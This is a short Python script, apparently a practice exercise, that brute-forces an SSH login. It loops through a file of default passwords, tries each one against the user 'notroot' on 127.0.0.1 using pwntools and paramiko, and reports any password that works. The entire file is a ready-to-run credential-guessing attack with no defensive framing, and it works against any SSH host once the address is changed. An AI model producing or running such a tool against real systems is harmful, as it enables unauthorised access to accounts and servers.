#!/usr/bin/python3

import paramiko.ssh_exception
from pwn import *
import paramiko

host = '127.0.0.1'
username = 'notroot'
attempts = 0

# import list of pws
with open('default-passwords.txt', 'r') as pw_list:
    # loop over the list
    for pw in pw_list:
        pw = pw.strip('\n')
        # if we manage to find a valid pw, print it and break, else continue
        try:
            print(f'[{attempts}] Attempting password: "{pw}" ') 
            response = ssh(host=host, user=username, password=pw, timeout=1)
            if response.connected():
                print(f'[>] Valid password discovered: "{pw}"!')
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("[!] Unable to connect to the SSH server. Trying next password.")
        except paramiko.ssh_exception.AuthenticationException:
            print('[X] Invalid password')
        attempts += 1
